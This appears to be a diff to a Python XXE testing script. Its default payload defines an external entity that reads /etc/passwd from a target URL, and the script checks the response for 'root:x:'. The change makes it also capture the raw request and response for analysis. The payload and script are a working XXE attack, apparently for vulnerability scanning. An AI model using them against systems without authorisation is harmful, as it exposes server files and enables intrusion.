@@ -13,7 +13,8 @@ from analysis_db.chat_analyzer import analyze_result
 DEFAULT_PAYLOAD = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
 
 
-def send_payload(url: str, payload: str) -> str:
+def send_payload(url: str, payload: str) -> tuple[str, dict]:
+    """Send the XXE payload and return response body and raw request info."""
     if not url.startswith(("http://", "https://")):
         url = "http://" + url
     data = payload.encode()
@@ -21,9 +22,15 @@ def send_payload(url: str, payload: str) -> str:
     req.add_header("Content-Type", "application/xml")
     try:
         with urllib.request.urlopen(req, timeout=5) as resp:
-            return resp.read().decode(errors="ignore")
-    except Exception:
-        return ""
+            body = resp.read().decode(errors="ignore")
+            raw = {
+                "request": payload,
+                "status": resp.getcode(),
+                "response": body[:200],
+            }
+            return body, raw
+    except Exception as e:
+        return "", {"request": payload, "error": str(e)}
 
 
 def main(argv: list[str] | None = None):
@@ -34,14 +41,19 @@ def main(argv: list[str] | None = None):
     args = parser.parse_args(argv)
 
     print(f"[+] Testing {args.url} for XXE")
-    body = send_payload(args.url, args.payload)
+    body, raw = send_payload(args.url, args.payload)
     vulnerabilities = []
     if "root:x:" in body:
         print("[!] XXE vulnerability detected")
         vulnerabilities.append({"payload": args.payload})
     else:
         print("[-] No vulnerability detected")
-    result = {"target": args.url, "payload": args.payload, "vulnerabilities": vulnerabilities}
+    result = {
+        "target": args.url,
+        "payload": args.payload,
+        "vulnerabilities": vulnerabilities,
+        "raw": raw,
+    }
     result.update(analyze_result(result))
     sock = os.environ.get("MINC_DB_SOCKET")
     if sock:
